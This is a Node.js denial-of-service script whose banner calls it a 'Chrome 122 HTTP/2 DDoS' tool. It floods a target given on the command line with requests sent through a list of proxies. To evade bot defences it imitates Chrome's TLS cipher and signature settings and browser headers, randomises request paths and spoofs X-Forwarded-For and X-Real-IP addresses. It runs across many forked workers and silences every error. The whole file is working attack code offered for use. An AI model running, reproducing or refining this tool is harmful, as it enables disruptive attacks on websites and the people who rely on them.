const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

// CHROME 122 CIPHER SUITES
const cipherSuites = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384"
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384"
].join(":");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const secureProtocol = "TLS_method";

if (process.argv.length < 7) {
    console.log(`Usage: node script.js host time req thread proxy.txt`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8")
    .split(/\r?\n/)
    .filter(line => line.trim() && !line.startsWith('#'));

// HEADERS CHROME 122 FULL
function getChromeHeaders(path) {
    return {
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": path || (parsedTarget.path || "/"),
        ":method": "GET",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="122", "Google Chrome";v="122", "Not:A-Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "pragma": "no-cache",
        "referer": "https://google.com/"
    };
}

// ========== NET SOCKET CLASS ==========
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nConnection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({
            host: options.host,
            port: options.port,
            timeout: 15000
        });

        let dataBuffer = '';
        let isConnected = false;

        connection.on("connect", () => {
            connection.write(payload);
        });

        connection.on("data", chunk => {
            dataBuffer += chunk.toString('utf-8');
            if (dataBuffer.includes("HTTP/1.1 200") || dataBuffer.includes("HTTP/1.0 200")) {
                if (!isConnected) {
                    isConnected = true;
                    return callback(connection, undefined);
                }
            }
            if (dataBuffer.includes("HTTP/1.1 403") || dataBuffer.includes("HTTP/1.1 407")) {
                connection.destroy();
                return callback(undefined, "error: proxy auth needed");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: " + err.message);
        });
    }
}

const Socker = new NetSocket();

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function generatePath() {
    const paths = [
        "/",
        "/?q=" + randstr(8),
        "/" + randstr(6) + "?v=" + randstr(10),
        "/api?" + randstr(5) + "=" + randstr(12),
        "/wp-admin/admin-ajax.php?action=" + randstr(10),
        "/?s=" + randstr(8) + "&" + randstr(6) + "=" + randstr(10),
        "/" + randstr(4) + "/" + randstr(6) + "?" + randstr(5) + "=" + randstr(8)
    ];
    return randomElement(paths);
}

// ========== CLUSTER MASTER ==========
if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mMode: \x1b[32mChrome 122 HTTP/2 DDoS\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[33mTime: \x1b[37m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZANGXX VVIP | TLS-HANDSHAKE CHROME 122\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

// ========== FLOODER ==========
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyHost = parsedProxy[0];
    const proxyPort = parseInt(parsedProxy[1]) || 443;

    const proxyOptions = {
        host: proxyHost,
        port: proxyPort,
        address: parsedTarget.host,
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2", "http/1.1"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ciphers: cipherSuites,
            sigalgs: sigalgs,
            ecdhCurve: "X25519:P-256",
            secureOptions: secureOptions,
            secureProtocol: secureProtocol
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (!tlsSocket.alpnProtocol || (tlsSocket.alpnProtocol !== 'h2' && tlsSocket.alpnProtocol !== 'http/1.1')) {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 600000);
            tlsSocket.setNoDelay(true);

            // HTTP/2 kalo support, fallback ke HTTP/1.1
            if (tlsSocket.alpnProtocol === 'h2') {
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                        headerTableSize: 65536,
                        maxHeaderListSize: 65536,
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        enablePush: false
                    }
                });

                let reqCount = 0;
                const maxReqs = args.Rate;

                const interval = setInterval(() => {
                    const path = generatePath();
                    const headers = getChromeHeaders(path);
                    
                    // Random spoofed IP header
                    const spoofIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                    headers["x-forwarded-for"] = spoofIP;
                    headers["x-real-ip"] = spoofIP;

                    for (let i = 0; i < Math.min(10, maxReqs); i++) {
                        try {
                            const req = client.request(headers);
                            req.on('response', () => { req.close(); req.destroy(); });
                            req.on('error', () => { req.destroy(); });
                            req.end();
                        } catch (err) {}
                    }
                }, 1000);

                client.on('close', () => {
                    clearInterval(interval);
                    client.destroy();
                    tlsSocket.destroy();
                    connection.destroy();
                });

                client.on("error", () => {
                    clearInterval(interval);
                    client.destroy();
                    tlsSocket.destroy();
                    connection.destroy();
                });

            } else {
                // HTTP/1.1 fallback
                let interval = setInterval(() => {
                    const path = generatePath();
                    const headers = getChromeHeaders(path);
                    const req = 
`GET ${path} HTTP/1.1\r
Host: ${parsedTarget.host}\r
User-Agent: ${headers["user-agent"]}\r
Accept: ${headers.accept}\r
Accept-Encoding: ${headers["accept-encoding"]}\r
Accept-Language: ${headers["accept-language"]}\r
Cache-Control: ${headers["cache-control"]}\r
Connection: keep-alive\r
Sec-Ch-Ua: ${headers["sec-ch-ua"]}\r
Sec-Ch-Ua-Mobile: ${headers["sec-ch-ua-mobile"]}\r
Sec-Ch-Ua-Platform: ${headers["sec-ch-ua-platform"]}\r
Upgrade-Insecure-Requests: 1\r
Sec-Fetch-Site: none\r
Sec-Fetch-Mode: navigate\r
Sec-Fetch-User: ?1\r
Sec-Fetch-Dest: document\r
Referer: https://google.com/\r
X-Forwarded-For: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\r
\r`;

                    for (let i = 0; i < Math.min(5, args.Rate); i++) {
                        try {
                            tlsSocket.write(req);
                        } catch (err) {}
                    }
                }, 1000);

                tlsSocket.on("close", () => {
                    clearInterval(interval);
                    tlsSocket.destroy();
                    connection.destroy();
                });

                tlsSocket.on("error", () => {
                    clearInterval(interval);
                    tlsSocket.destroy();
                    connection.destroy();
                });
            }
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });

        tlsSocket.on("close", () => {
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});